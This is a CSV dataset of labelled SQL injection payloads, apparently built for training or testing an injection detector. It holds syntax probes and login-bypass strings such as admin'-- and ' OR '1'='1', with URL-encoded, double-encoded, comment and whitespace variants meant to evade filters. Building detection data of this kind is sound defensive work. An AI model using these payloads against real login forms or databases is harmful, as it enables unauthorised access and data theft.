id=1 GROUP BY 1,1,sqli_syntax_probe,ws_space,raw,SQLI_SYNTAX_PROBE_012,3254f07bc5d57440f978a4a983da5b27,788ff5b13a8e2f2769d42eb8b417b9f4,15
id%3D1%09ORDER%09BY%09100,1,sqli_syntax_probe,case_var|ws_tab,url_encoded,SQLI_SYNTAX_PROBE_011,8edb911097426a65ae809778e400a8ea,9f13ddda4f0dbf311c4e8d8a54ae7fa3,25
id%253D1--,1,sqli_syntax_probe,case_var|ws_url_space,double_encoded,SQLI_SYNTAX_PROBE_008,34ef083d99b934fdcdac0ddef94261c7,47b4f20b57e287c89e0464d711db287f,10
"id%3D1""",1,sqli_syntax_probe,case_var,partially_encoded,SQLI_SYNTAX_PROBE_002,c445c47e84154f0c4fac60a9a4d62068,2bf0005da5a79a3e1a0eb4abcf33bee3,7
id%3D1%5C%22--,1,sqli_syntax_probe,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_SYNTAX_PROBE_004,4f387130045927c0e2fb2ef4876c6c7b,3fa9bf2eb2abdacf1bfbaa379bfb56fc,14
id=1\',1,sqli_syntax_probe,ws_space,raw,SQLI_SYNTAX_PROBE_003,62d03b34adc111577692e902155c46e5,62d03b34adc111577692e902155c46e5,6
"id=1"")",1,sqli_syntax_probe,case_var|ws_mixed_ws,raw,SQLI_SYNTAX_PROBE_006,c8605783b5514e6f5d6b95c580bfa99f,c8605783b5514e6f5d6b95c580bfa99f,6
id=1+ORDER+BY+100/*,1,sqli_syntax_probe,comment_block_comment|ws_mixed_ws,raw,SQLI_SYNTAX_PROBE_011,bd45996a45deece2f6757faddea0e702,5e4a04df417aa66d244d7689db501452,19
id%3D1%22%2F%2A,1,sqli_syntax_probe,case_var|comment_block_comment,url_encoded,SQLI_SYNTAX_PROBE_002,9bd5462993cd96f64cab1f166b3ae1b9,9d26fad66c1095c6121047cd3c18edfb,15
id=1----+-,1,sqli_syntax_probe,case_var|comment_dash_dash_space|ws_plus,raw,SQLI_SYNTAX_PROBE_008,c97789265960dbee44b6771b521f707f,c97789265960dbee44b6771b521f707f,10
id%3D1%5C%22%3B--+-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_space,url_encoded,SQLI_SYNTAX_PROBE_004,725cfe7819d5b2a63624dc93d1057941,290f35e6b4ce8ae03e34dce1d606acdd,19
id%253D1%2522%2529%252F%252A,1,sqli_syntax_probe,comment_block_comment|ws_tab,double_encoded,SQLI_SYNTAX_PROBE_006,5b4e41b81c0fa18e51ae66df3ac2e0ca,6ade27c4bb940474ed3b791ec84a018f,28
id%253D1%2522--,1,sqli_syntax_probe,comment_dash_dash|ws_plus,double_encoded,SQLI_SYNTAX_PROBE_002,6501b3162cbd033f7ef02180730532f8,1bea1feba34752f0f5157f4688e807ac,15
id%3D1%27),1,sqli_syntax_probe,case_var|ws_comment_ws,partially_encoded,SQLI_SYNTAX_PROBE_005,f8efbc128b9696e07384c6a306d69f7e,ce00f2d9e3eebee90a18d31491a87a45,10
id%253D1%2527%253B%252523,1,sqli_syntax_probe,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_SYNTAX_PROBE_007,5cd54b716ae1c0d195138b57d08a93b9,a2fc4c566c2b8815e9f0ce950ec3f6fd,25
id=1 ORDER BY 1%23,1,sqli_syntax_probe,comment_url_hash|ws_space,raw,SQLI_SYNTAX_PROBE_010,b561a56f4a73bb51dae36ba65b66696c,44211de02211cef41420b12dd82cc728,18
id%3D1	GROUP	BY	1,1,sqli_syntax_probe,case_var|ws_tab,partially_encoded,SQLI_SYNTAX_PROBE_012,1994b0af5222dd6ec7fadeff29cdb302,bc0ee41e9393d66998b96cdbd6f152cb,17
id%3D1\%27%23,1,sqli_syntax_probe,case_var|comment_hash,partially_encoded,SQLI_SYNTAX_PROBE_003,7eb47c39b0b2b18b227e815b89f84119,43c52f8370f9cd7bd94faee9398eb0e3,13
id=1\'/*,1,sqli_syntax_probe,comment_block_comment|ws_plus,partially_encoded,SQLI_SYNTAX_PROBE_003,7a088c7dcdace473bbcc1bb5bd12500b,7a088c7dcdace473bbcc1bb5bd12500b,8
id%253D1%255C%2522--%2B-,1,sqli_syntax_probe,case_var|comment_dash_dash_space,double_encoded,SQLI_SYNTAX_PROBE_004,3682ac67ef62c6031fb58e46d0e0447a,ce118d5254849b8b140f6e75b24067d2,24
id%3D1%23%3B--%09-,1,sqli_syntax_probe,comment_semicolon_comment|ws_tab,url_encoded,SQLI_SYNTAX_PROBE_009,4c31d779d0dc5a95ae0afb5efac5dc4c,cf04174c651b04a1735038c7a1f89039,18
id%3D1%23,1,sqli_syntax_probe,case_var|ws_url_space,url_encoded,SQLI_SYNTAX_PROBE_009,be0cd1278cc1ac314b0eab4334e0971f,7b9e708cb6afad656350fd5237bc1994,9
id%3D1+GROUP+BY+1--,1,sqli_syntax_probe,comment_dash_dash,url_encoded,SQLI_SYNTAX_PROBE_012,89270f234bc41d0cdcce621ac1a426a2,160a69bcd867d9beaf8def2321069623,19
id=1\';--/**/-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_SYNTAX_PROBE_003,67d0da3ec26eefd0627138045b7fc4a4,67d0da3ec26eefd0627138045b7fc4a4,14
id=1\'%23,1,sqli_syntax_probe,comment_url_hash,raw,SQLI_SYNTAX_PROBE_003,089c88173cc52f72687cbc00a01c7f85,089c88173cc52f72687cbc00a01c7f85,9
id%3D1+ORDER+BY+100,1,sqli_syntax_probe,standard,url_encoded,SQLI_SYNTAX_PROBE_011,aa2abc0e3686a27f0ff57bc86d781823,25f89568176f21ce5d8a589315d6381e,19
id=1'%23,1,sqli_syntax_probe,case_var|comment_url_hash,raw,SQLI_SYNTAX_PROBE_001,49cea634b2720221d6c9ad3b2f664a1e,49cea634b2720221d6c9ad3b2f664a1e,8
"id%3D1\""--+-",1,sqli_syntax_probe,comment_dash_dash_space,partially_encoded,SQLI_SYNTAX_PROBE_004,9fb2d342c91d519fdc21a260d1f6c3f4,c12cc459dcf6145c474bd396e2a8491d,12
id%3D1%22)--,1,sqli_syntax_probe,case_var|comment_dash_dash,partially_encoded,SQLI_SYNTAX_PROBE_006,93bcf8f4448355b7b21bb7ee29cb0217,91f14ed4dffd6321beb368a5c799234c,12
id%3D1'/*,1,sqli_syntax_probe,case_var|comment_block_comment,partially_encoded,SQLI_SYNTAX_PROBE_001,be3da6f94f72f87fb440ff681ab755fd,b4ea23031aa7bb76556c423385ce5b5d,9
id%253D1%2527%2529--,1,sqli_syntax_probe,case_var|comment_dash_dash,double_encoded,SQLI_SYNTAX_PROBE_005,656ee901d38b980513cd4f8c4d7a414f,bacfa2dfbb95e770df74be44eefb1278,20
id%3D1+ORDER BY 1%23,1,sqli_syntax_probe,comment_url_hash|ws_space,partially_encoded,SQLI_SYNTAX_PROBE_010,870029e63a024a58f11869bf35fce7b6,b1faed3d4aa69eaef553270e20a2a937,20
id%3D1%23/*,1,sqli_syntax_probe,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_SYNTAX_PROBE_009,e1545d5401b807c2836353b0feb6a9b6,4003d2efe41746a9a89ce86a57ec27af,11
"id=1""#",1,sqli_syntax_probe,case_var|comment_hash|ws_mixed_ws,raw,SQLI_SYNTAX_PROBE_002,4b3fa99a1fa3488847458c13548a84d2,4b3fa99a1fa3488847458c13548a84d2,6
id%3D1%5C%27%2523,1,sqli_syntax_probe,case_var|comment_url_hash,url_encoded,SQLI_SYNTAX_PROBE_003,5472bf59fa3cd11bffda3ed581e9ff00,5057b974c32406090b6eb39b82ff02fc,17
username%253D%2522%2BOR%2B%25221%2522%253D%25221%2522%2526password%253D%2522%2BOR%2B%25221%2522%253D%25221%2522%2523,1,sqli_auth,comment_hash,double_encoded,SQLI_AUTH_004,3fedf505ed5e9581cb0106fa5bab15d5,1bf77cf35075b8c03e2ba18be1e5bdb6,116
username%3Dadmin'--&password=anything,1,sqli_auth,case_var|ws_mixed_ws,partially_encoded,SQLI_AUTH_005,7bafc7d939c5abe4f693eefb4a5192b1,7a92ae5257eea97dd1f1f8e0197a58d0,37
username%253Dadmin%2527%252F%252A%252A%252F--%252F%252A%252A%252F-%2526password%253D123,1,sqli_auth,case_var|comment_dash_dash_space|ws_comment_ws,double_encoded,SQLI_AUTH_001,03ecdb133da6880809e142b838cbb5f3,4d339b34d924d1fc38a26d60b3cccae2,87
username%253Dadmin%2527--%2526password%253Danything,1,sqli_auth,case_var|ws_mixed_ws,double_encoded,SQLI_AUTH_005,50bbd8e2cd44c79f735f475ae817cf8d,93ce308d2f3d2301964d52db954f372f,51
username=admin%27+--+-&password%3D123,1,sqli_auth,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_AUTH_001,552c424465ea456a8fe1a6106f5e43f0,20872b2abd2961f5ff8fd4a6e3ebfef1,37
username%253Dadmin%2527%2B%2523%2526password%253D123,1,sqli_auth,comment_hash,double_encoded,SQLI_AUTH_001,6d0026324850d0d293cce4c7868533b1,7cc081050773f8b35d9142351a81651d,52
username=' Or ''='&password=' OR ''=',1,sqli_auth,case_var|ws_space,raw,SQLI_AUTH_007,03206354f993ef39f991816b256c05d8,b3ed8bd928cd0cbbc092a782d861dfe4,37
username=admin'--&password=anything#,1,sqli_auth,case_var|comment_hash|ws_url_space,raw,SQLI_AUTH_005,5b440abc4f23e538d75c6a8a3ef704f9,5b440abc4f23e538d75c6a8a3ef704f9,36
username%3D%27+Or+1%3D1+%3B--+-%26password%3D123,1,sqli_auth,case_var|comment_semicolon_comment,url_encoded,SQLI_AUTH_006,54f554fb194ca751434187b8272e9e23,91a9bd4650a0fdbd6f4d0d3baf4b5fcf,48
username%3D'/%2A%2A%2For%2F%2A*%2F%27%27%3D'&password%3D'%2F*%2A/Or/%2A%2A%2F%27'%3D'%23,1,sqli_auth,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_AUTH_007,4bdf624533e87d5babf579a4ee57e486,0a5ad7625dc3c2131e73b678c0af1a93,88
username%3Dadmin%27--%26password%3Danything,1,sqli_auth,ws_url_space,url_encoded,SQLI_AUTH_005,7105713d02df7404d7d8dba38b5e8e58,3d019d42335e0545d444836d35bf7c33,43
username%3D%22+OR+%221%22%3D%221%22%26password%3D%22+OR+%221%22%3D%221%22,1,sqli_auth,standard,url_encoded,SQLI_AUTH_004,c83c7416a0489201ac6c8389ca056c4a,c939916cbacf1e20e43f19ab65b25b04,73
username=admin'	OR	'1'='1'	--&password=pass,1,sqli_auth,case_var|comment_dash_dash|ws_tab,raw,SQLI_AUTH_002,f93ff0211bbbd34fdf2de4745031a532,92a0c24bf90b4f6187a34e2d3eff6fed,43
username%253Dadmin%2527%2509or%2509%25271%2527%253D%25271%2527%2509%252F%252A%2526password%253Dpass,1,sqli_auth,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_AUTH_002,7d7fcd073ebb034cf9b4dc1d4faf810b,4d17eff6c936b608582a6df1cfd2bd4f,99
username%253Dadmin%2527%2509OR%2509%25271%2527%253D%25271%2527%2509%2523%2526password%253Dpass,1,sqli_auth,comment_hash|ws_tab,double_encoded,SQLI_AUTH_002,bf516aa4b911b8788ca50fbff3b93b50,82c189bedfdb4bbcc026a8747aaf8087,94
username=admin' OR %271'=%271' %23&password=pass,1,sqli_auth,case_var|comment_hash|ws_space,partially_encoded,SQLI_AUTH_002,e3534194faa5c0f01c2f6b6acada2c21,06543b4d1cfe0711b0a9a6adac56f0f3,48
"username=""  OR  ""1""=""1""&password=""  OR  ""1""=""1""%23",1,sqli_auth,comment_url_hash|ws_multi_space,raw,SQLI_AUTH_004,a7e672377c3e0944baf87e5ecc8c674a,40933fd00c7f31f6b3aefa0697d35949,50
username%3D%27 or+'%27='&password%3D'+Or+%27%27%3D%27,1,sqli_auth,case_var,partially_encoded,SQLI_AUTH_007,4078f119e20fc628761912a1ba57ceb1,e6a8b85d3783fd2b13f2559a94f41f4a,53
username%3D%27%09or%09%271%27%3D%271%27%26password%3D%27%09or%09%271%27%3D%271%27,1,sqli_auth,case_var|ws_tab,url_encoded,SQLI_AUTH_003,bd89cde195823ca0333787e0f0a11b3c,93730f801a32d8ac98a60379d7bb820a,81
username%3Dadmin%27%09--%26password%3D123,1,sqli_auth,case_var|comment_dash_dash|ws_tab,url_encoded,SQLI_AUTH_001,27970bd8d988969a366ff902c2f79b25,eef317600cf3782ba39089ef8fac3713,41
username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B%2523%2526password%253Dpass,1,sqli_auth,case_var|comment_hash,double_encoded,SQLI_AUTH_002,2ffd89df1a9a0ee3a416d2cb7a973880,dd4eea65b1ca11115aaa0e4fdc354b40,88
username%3D%27+or+%27%27%3D%27%26password%3D%27+OR+%27%27%3D%27,1,sqli_auth,case_var,url_encoded,SQLI_AUTH_007,4e2f04444eda972947dc9d13dc784e02,431ce29e5dd31f3d2bc12dd8cd4d72d9,63
username%253D%2527%252BOR%252B%25271%2527%253D%25271%2527%2526password%253D%2527%252BOr%252B%25271%2527%253D%25271%2527%253B--%252B-,1,sqli_auth,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_AUTH_003,e291a7eabfcceed0614b97fec710e4cc,77dd756ee14dfdb8cb1df0d7056aae75,132
username%3Dadmin%27--&password%3Danything%2F*,1,sqli_auth,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_AUTH_005,59b0a2b1530d5f3a5913d1c965c8d777,d4195aa5c1e31341b1cc78a0e8f405f8,45
username=admin' Or '1'='1' /*&password=pass,1,sqli_auth,case_var|comment_block_comment,raw,SQLI_AUTH_002,f400a64e8ab6b8cfe896ef3b804af914,4c346e4b424dcb64e036bbbffcd7775e,43
username=%27+OR+1=1+%2F*&password=123,1,sqli_auth,comment_block_comment,partially_encoded,SQLI_AUTH_006,6cdc448eaf8ed2b57d75ff311ca80585,493d4de182ae3234961d4f593b761ca8,37
username%3Dadmin%27+--+-%26password%3D123,1,sqli_auth,comment_dash_dash_space,url_encoded,SQLI_AUTH_001,9d41f786acff73bb4059900900656d4b,5804c1c81a7ce303aab4a46b5af15743,41
username%253D%2527%2BOR%2B1%253D1%2B%2523%2526password%253D123,1,sqli_auth,case_var|comment_hash,double_encoded,SQLI_AUTH_006,d6f8d2c0346680a8f104c1d60caf36a8,5218b059a3432abf1d0ff92ce4a195ee,62
username%3D%22%2520or%2520%221%22%3D%221%22%26password%3D%22%2520Or%2520%221%22%3D%221%22%2F%2A,1,sqli_auth,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_AUTH_004,3810004f4500a2433aec62c9a1eec866,7fb3170fab273b0d43921f66dbf82c99,95
"username=%22%20OR%20%221""=%221""&password=""%20OR%20""1""%3D%221""--%20-",1,sqli_auth,comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_AUTH_004,82c1ccdbf9e523d102128cdd4cabef8e,7e6a74a44c8e03a4603bf43f1843d044,67
username=admin' #&password=123,1,sqli_auth,comment_hash,raw,SQLI_AUTH_001,80df76fe7b6acf7280fa24c5b173b1b5,827b91d7912d9ca6b6d93425cb06316a,30
"username%3D""+or+%221%22%3D%221%22&password%3D%22+Or+%221%22%3D""1""",1,sqli_auth,case_var|ws_plus,partially_encoded,SQLI_AUTH_004,8326b8c26a7672e21b1afbb3bc5d6dfc,71e54f1d621bd0c630df4561febcb75e,65
username=admin'--&password=anything,1,sqli_auth,ws_url_space,raw,SQLI_AUTH_005,43f9e7f0a127f45545f39ad7751e8b81,43f9e7f0a127f45545f39ad7751e8b81,35
"username="" OR ""1""=""1""&password="" OR ""1""=""1""",1,sqli_auth,standard,raw,SQLI_AUTH_004,ba4bf0d8e66833e208090300efdd0f38,d0d8616d2c234dfdde9d6d7cf03c5a22,43
"username="" OR ""1""=""1""&password="" OR ""1""=""1""-- -",1,sqli_auth,case_var|comment_dash_dash_space,raw,SQLI_AUTH_004,7b11b803438c39b8a61944e0adb1ddde,237b2e809ab38fe3a57249ac96570272,47
username='	OR	'1'='1'&password='	OR	'1'='1';--	-,1,sqli_auth,comment_semicolon_comment|ws_tab,raw,SQLI_AUTH_003,ffcdb2360a5997c6903bfeb459823645,c8717c44d59aafeda6d893f694276af8,48
username=admin'/**/%23&password=123,1,sqli_auth,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_AUTH_001,a96e85961d311d4a9e5ad7c9e3341bc5,a96e85961d311d4a9e5ad7c9e3341bc5,35
"username%3D%22 or+%221%22=""1""&password=""+Or %221""%3D%221%22%23",1,sqli_auth,case_var|comment_hash,partially_encoded,SQLI_AUTH_004,f833f243f271cfe985e1f0551dfb1681,d388e0edf3d8cc864d9d3b99295fd847,62
username%3Dadmin%27+%2523%26password%3D123,1,sqli_auth,comment_url_hash|ws_space,url_encoded,SQLI_AUTH_001,50de66d7948df7ed8a6001575b7bc706,022f75ca17a55569d3027ff41f4e9061,42
username=admin' OR '1'='1' #&password=pass,1,sqli_auth,comment_hash,raw,SQLI_AUTH_002,87d98f916339cdd73b5e47ce26d37712,13365a652304d46d160e89a8603969b5,42
"username=""+ OR +%221%22=%221%22&password%3D"" +OR+ ""1%22=""1%22;--  -",1,sqli_auth,comment_semicolon_comment|ws_multi_space,partially_encoded,SQLI_AUTH_004,73d3cab318d249d2cb3b7accea5ce9f7,fd91457b6af5daf3018f797d50b4b2f2,67
username%3D%27+OR+%271%27%3D%271%27%26password%3D%27+OR+%271%27%3D%271%27%2523,1,sqli_auth,comment_url_hash,url_encoded,SQLI_AUTH_003,9169a809ddce27368f46fd34dad02a24,bc5e9dedde4d83f0e66464dab22619c8,78
username%3Dadmin'--&password=anything;--%20-,1,sqli_auth,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_AUTH_005,85d1ec0363003eb8de17124970282d48,c219e9e4a662d206a1aa400bd59a5565,44
username%3D%22%09Or%09%221%22%3D%221%22%26password%3D%22%09or%09%221%22%3D%221%22,1,sqli_auth,case_var|ws_tab,url_encoded,SQLI_AUTH_004,17f3d4d1ffa3f99748a71a796403c93d,8f44f9bce759f979e34757bcd47a7d50,81
username%3D%22+Or+%221%22%3D%221%22%26password%3D%22+or+%221%22%3D%221%22%3B--+-,1,sqli_auth,case_var|comment_semicolon_comment,url_encoded,SQLI_AUTH_004,63a2234a64ed175a7570e10b962aca88,2a663ed508c2da3fd6d97fe517a8bf2c,80
username%253Dadmin%2527--%2526password%253Danything%2523,1,sqli_auth,case_var|comment_hash,double_encoded,SQLI_AUTH_005,4426957a1687d52fc5c95f0608fcdcbd,5ef47b21fcda1c117d31712af72b117d,56
username=%27%20OR%201%3D1%20%23&password=123,1,sqli_auth,comment_url_hash|ws_url_space,partially_encoded,SQLI_AUTH_006,99cd854540892b6e269bb9227124dce0,7cb08bbd4e73ca1514b2773c1bacaaa5,44
username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B--%2B-%2526password%253Dpass,1,sqli_auth,comment_dash_dash_space|ws_space,double_encoded,SQLI_AUTH_002,b4ac3010336c9bc13a44e90c8b787f5a,15b79a75b828e8ef2d1a2fc2e583a4fc,89
username%253D%2527%252520OR%252520%25271%2527%253D%25271%2527%2526password%253D%2527%252520OR%252520%25271%2527%253D%25271%2527,1,sqli_auth,ws_url_space,double_encoded,SQLI_AUTH_003,d2036315e6bb319fb2a548e3af6c8b0d,cc93337ab613b4a1fdcdded97039b4a8,127
username=admin'	or	'1'='1'	--	-&password=pass,1,sqli_auth,case_var|comment_dash_dash_space|ws_tab,raw,SQLI_AUTH_002,19abe6a1f6fb2b1aaafa2917cc2538c8,35ac910792d85c20fd62247362f62fe4,45
username=' OR '1'='1'&password=' OR '1'='1'#,1,sqli_auth,comment_hash,raw,SQLI_AUTH_003,4d5e86bff550908bd6d3aa15d6a59122,4f7d8c95eacd916f75532ba49299a119,44
username%253Dadmin%2527%2509%253B--%2509-%2526password%253D123,1,sqli_auth,case_var|comment_semicolon_comment|ws_tab,double_encoded,SQLI_AUTH_001,c9e9d077e8e8d561a65c4542bdc0d9f1,6e7ea63473fc515df1e95009d7f1ec91,62
username=admin'   ;--   -&password=123,1,sqli_auth,comment_semicolon_comment|ws_mixed_ws,raw,SQLI_AUTH_001,f9f2473fbdbc458e47e1faa7efa13fab,de23df2f77defdf0ce752ea74574a01c,38
username%253D%2522%2BOr%2B%25221%2522%253D%25221%2522%2526password%253D%2522%2BoR%2B%25221%2522%253D%25221%2522%253B--%2B-,1,sqli_auth,case_var|comment_semicolon_comment,double_encoded,SQLI_AUTH_004,ef345534358d72e76dee553e829f90c3,3712b4fba57b1e8a7375fb1e68e5e8ed,122
username%3D%27%2520or%25201%3D1%2520%23%26password%3D123,1,sqli_auth,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_AUTH_006,ccfef6034aef3d7a2335ca8af61227eb,f154c0aa12c320562f8dc7832f56bc7f,56
username=admin'+/*&password=123,1,sqli_auth,case_var|comment_block_comment|ws_plus,raw,SQLI_AUTH_001,fafafcf9bfaf6162fb4c55a5d4b09053,fafafcf9bfaf6162fb4c55a5d4b09053,31
username=' oR 1=1 -- -&password=123,1,sqli_auth,case_var|comment_dash_dash_space,raw,SQLI_AUTH_006,79ea440a14cfb0a2ebabca562aaf0095,34bb790845a56aefd74f7b7d0aa60f9a,35
username%3D'+or+%271'=%271%27&password%3D%27+OR+'1%27=%271',1,sqli_auth,case_var|ws_mixed_ws,partially_encoded,SQLI_AUTH_003,bef1f8a9b90b0b17942636731a003967,3bd523ccbf8ece67140203a1514b503a,59
username=admin%27+OR+%271%27%3D%271%27+;--+-&password=pass,1,sqli_auth,case_var|comment_semicolon_comment|ws_plus,partially_encoded,SQLI_AUTH_002,84676cf66522d8588d54f9523709dad3,a371a709ced3c90b8d24b43cb57e6e69,58
"username%3D%22++OR++%221%22%3D%221""&password=""++OR  %221%22%3D%221%22",1,sqli_auth,ws_multi_space,partially_encoded,SQLI_AUTH_004,c2f81eddafc26cbace933f4d02c2669f,74d1bbd3446ac3ba7753acf6bff7dbf7,69
username=admin'/**/--&password=123,1,sqli_auth,comment_dash_dash|ws_comment_ws,raw,SQLI_AUTH_001,99d58dcc8718ddd68f617b7743d8cca2,99d58dcc8718ddd68f617b7743d8cca2,34
username=admin' -- -&password=123,1,sqli_auth,case_var|comment_dash_dash_space,raw,SQLI_AUTH_001,57643a74085a13232b227a1479cd6e0f,a41071550368c4c414d35b2ca7e57821,33
username='%20OR%20''='&password='%20or%20''='%23,1,sqli_auth,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_AUTH_007,a47f62f1ff2bb35a63d8be982aff2f98,19684ec12c38164993b9adc573e3fb34,48
username%253D%2527%2BOR%2B%2527%2527%253D%2527%2526password%253D%2527%2BOR%2B%2527%2527%253D%2527%252F%252A,1,sqli_auth,comment_block_comment,double_encoded,SQLI_AUTH_007,d22894ef1fd26bd2940ad4a2e8145370,ce824a96bbbbca01bab0f5aef1487015,107
username=admin'%20#&password=123,1,sqli_auth,case_var|comment_hash|ws_url_space,raw,SQLI_AUTH_001,74b1c405eceb73d3014f38088c56b0f3,74b1c405eceb73d3014f38088c56b0f3,32
username='+oR+''='&password='+Or+''='--,1,sqli_auth,case_var|comment_dash_dash|ws_plus,raw,SQLI_AUTH_007,e794699157ea8b2ff599dbcc1833622f,b39ca9317ee4701929149b81920ed150,39
username%3Dadmin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-%26password%3Dpass,1,sqli_auth,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_AUTH_002,73e6e4501fda875d6d78ba41c06b4dc8,9f49621c52c3b214fbb505715137e9c7,110
username='+OR+%27%27=%27&password%3D%27+OR+'%27%3D'/%2A,1,sqli_auth,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_AUTH_007,c108ce85bfbeccff4eefd2a4d6c35d99,21439a0ce38a11d74ad9e4f84dc6abed,55
username%253D%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%25221%2522%253D%25221%2522%2526password%253D%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%25221%2522%253D%25221%2522%252523,1,sqli_auth,comment_url_hash|ws_mixed_ws,double_encoded,SQLI_AUTH_004,e520ecb07f32624d85600eedf4435cc2,ce963763bf446f294796775f44fa5cb1,186
username=admin'/**/or/**/'1'='1'/**//*&password=pass,1,sqli_auth,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_AUTH_002,854add21019c5ca10949199f9b4be8da,854add21019c5ca10949199f9b4be8da,52
username='%20Or%201=1%20%3B--%20-&password=123,1,sqli_auth,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_AUTH_006,b4bd7a8bbc44645c5b65a8c31dce1521,5c968a484b90214f5a284ad15ba35f4e,46
username%3Dadmin%27+or+%271%27%3D%271%27+--%26password%3Dpass,1,sqli_auth,case_var|comment_dash_dash,url_encoded,SQLI_AUTH_002,c4050201ba7f348fe9917d0e0ec5f651,80dab9047dbeb8c265a09f43f2b7e53c,61
username%3D%27/**/or%2F*%2A%2F'1'%3D'1%27&password%3D'%2F*%2A%2FoR%2F%2A%2A/%271'=%271',1,sqli_auth,case_var|ws_comment_ws,partially_encoded,SQLI_AUTH_003,a58a026586834b0f424045049f48e2b1,9e2067c6896d484837257c9ca3de7aaa,87
username%3Dadmin%27--&password%3Danything,1,sqli_auth,ws_space,partially_encoded,SQLI_AUTH_005,efad2cac6634f727c4482a6b3b703d4c,db5a7d4a8eb860be4ffde7d03be4d463,41
"username=""%20OR%20""1""=""1""&password=""%20OR%20""1""=""1""/*",1,sqli_auth,comment_block_comment|ws_url_space,raw,SQLI_AUTH_004,bc03d7ab79b446940b9b7fa25836fd72,5b343f75736300135d97f6c6f7de06bc,53
username%3Dadmin%27+%2F%2A%26password%3D123,1,sqli_auth,case_var|comment_block_comment,url_encoded,SQLI_AUTH_001,58cf0b856076905ba15e466de94dcb9d,5b9b939dcb897d157034b9252a658a30,43
username%253D%2527%252BOr%252B1%253D1%252B--%252B-%2526password%253D123,1,sqli_auth,case_var|comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_AUTH_006,5e6cdf430e425419db30929a88ec6c41,200c6b75f23062808786e845e22b1748,71
username%3Dadmin'--&password=anything%3B-- -,1,sqli_auth,case_var|comment_semicolon_comment,partially_encoded,SQLI_AUTH_005,6649657f66e587c2fb5cce58c2dff71b,54eb7b5cdfa28c0fa0b55f11adc2c662,44
username='%20OR%201=1%20/*&password=123,1,sqli_auth,comment_block_comment|ws_url_space,raw,SQLI_AUTH_006,f41c0f8da4ad5aa777f87ee4120a861a,8a6527693a86037987e336c6624da678,39
username%3Dadmin'--&password%3Danything,1,sqli_auth,case_var|ws_comment_ws,partially_encoded,SQLI_AUTH_005,6bdca4f2277323ee76bbaea5f8ecbe36,18e0390753a40c7f488c8e8d453e2cc9,39
username%3Dadmin%27--%26password%3Danything%3B--%09-,1,sqli_auth,case_var|comment_semicolon_comment|ws_tab,url_encoded,SQLI_AUTH_005,d2e96049419d2fd1676fc98e66bfb4bd,64fbb8485c2b629cac9688e6e487f852,52
username=' oR ''='&password=' Or ''='/*,1,sqli_auth,case_var|comment_block_comment,raw,SQLI_AUTH_007,53586eb0b9859630807cf7b655aece00,765fe6d7c3e330db42e0e3274c8aaab7,39
username=admin' --&password=123,1,sqli_auth,case_var|comment_dash_dash,raw,SQLI_AUTH_001,f2177ac51e85b703214fe53cf2794860,06dc8e9182d4f26fd1fb844f23b88fca,31
username=' OR 1=1 #&password=123,1,sqli_auth,comment_hash,raw,SQLI_AUTH_006,94a3ed19f04235800035ef05b66ce732,2f2fcd02325e4dd8f4084a08ea08cc87,32
username%3Dadmin%27--%26password%3Danything%2523,1,sqli_auth,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_AUTH_005,6c30d14ae84d9bc47eda9f142bbc0c32,269324289ce22583eaa171672bc87ac4,48
username%253D%2527%252F%252A%252A%252FOr%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%2523%2526password%253D123,1,sqli_auth,case_var|comment_hash|ws_mixed_ws,double_encoded,SQLI_AUTH_006,6fc39244cd937060068190569425c1ad,459669245c4c549fa927f030fbb95d7b,113
username=' or ''='&password=' or ''=';-- -,1,sqli_auth,case_var|comment_semicolon_comment|ws_space,raw,SQLI_AUTH_007,3a84b7f0f9f16d3496e459da453e9b9d,c2ae9047455e1f04b47e4c2e2b370277,42
username%3D%27 Or 1%3D1 --+-&password=123,1,sqli_auth,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_AUTH_006,3025dd17b329bffe4d3d7ccc3582b957,926977be05753492ed1abcba2bfba383,41
username%3D%27%09or%09%27%27%3D%27%26password%3D%27%09or%09%27%27%3D%27,1,sqli_auth,case_var|ws_tab,url_encoded,SQLI_AUTH_007,8dbd36c4bd42cdf9c42e5e4847fb39e4,763cad49f44ef078ba8933be4224784f,71
username%3Dadmin%27+Or+%271%27%3D%271%27+%2523%26password%3Dpass,1,sqli_auth,case_var|comment_url_hash,url_encoded,SQLI_AUTH_002,38c9ea5a84646a4f730ef59069d91572,729901e6661edb23052fe9369c4737c2,64
username%3D'+Or+%271%27%3D'1'&password%3D%27 OR %271'=%271%27,1,sqli_auth,case_var,partially_encoded,SQLI_AUTH_003,e16ed88dbe68c2defd155744e373276a,04499db10dc3af2d071d4db80d4a30bd,61
username%3Dadmin' #&password%3D123,1,sqli_auth,case_var|comment_hash,partially_encoded,SQLI_AUTH_001,1307453c4ae60650cab52923ac8b209b,4cdf526e7820db1f714b8258afde536d,34
